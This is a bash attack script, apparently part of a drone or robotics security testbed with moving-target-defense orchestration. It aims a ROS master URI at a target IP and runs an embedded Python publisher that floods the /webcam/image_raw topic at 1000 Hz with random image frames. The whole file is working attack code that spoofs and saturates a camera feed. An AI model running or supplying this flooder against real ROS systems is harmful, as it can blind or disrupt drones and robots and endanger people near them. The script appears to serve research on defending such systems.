#!/usr/bin/env bash
set -euo pipefail

# Camera feed ROS topic flooding (MTD-aware)

# MTD_INTERFACE_START
if [[ -z "${TARGET_IP:-}" ]]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Run via attack_orchestrator.py so MTD state can resolve the target." >&2
    exit 1
fi

case "${TARGET_SERVICE:-ROS_MASTER}" in
  ROS_MASTER)
    TARGET_PORT="${TARGET_PORT:-11311}"
    ;;
  *)
    TARGET_PORT="${TARGET_PORT:-11311}"
    ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-ROS_MASTER})"
# MTD_INTERFACE_END

export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=camera-feed-ros-topic-flooding src=Camera-Feed-ROS-Topic-Flooding.md"

# ROS 마스터(TARGET_IP:TARGET_PORT)를 대상으로 /webcam/image_raw 토픽 플러딩
export ROS_MASTER_URI="http://${TARGET_IP}:${TARGET_PORT}"
export ROS_IP="${ROS_IP:-$(hostname -I | awk '{print $1}')}"
# ROS 환경이 준비되어 있다면 사용, 아니면 그냥 진행
if [[ -f "/opt/ros/noetic/setup.bash" ]]; then
    # shellcheck disable=SC1091
    source /opt/ros/noetic/setup.bash
fi

log "[BLOCK 1] type=python (ROS Image Flooder)"
python3 - << 'PY'
import numpy as np

try:
    import rospy
    from sensor_msgs.msg import Image
except ImportError as e:
    print(f"[ERROR] ROS Python packages not available: {e}")
    raise SystemExit(1)

def flood_topic():
    rospy.init_node("image_flooder", anonymous=True)
    pub = rospy.Publisher("/webcam/image_raw", Image, queue_size=10)
    rate = rospy.Rate(1000)  # 1000 Hz flooding

    while not rospy.is_shutdown():
        img = Image()
        img.height = 480
        img.width = 640
        img.encoding = "rgb8"
        img.is_bigendian = 0
        img.step = img.width * 3
        img.data = np.random.bytes(img.step * img.height)
        pub.publish(img)
        rate.sleep()

if __name__ == "__main__":
    try:
        print("[INFO] Starting ROS image flooder on /webcam/image_raw")
        flood_topic()
    except rospy.ROSInterruptException:
        pass
PY
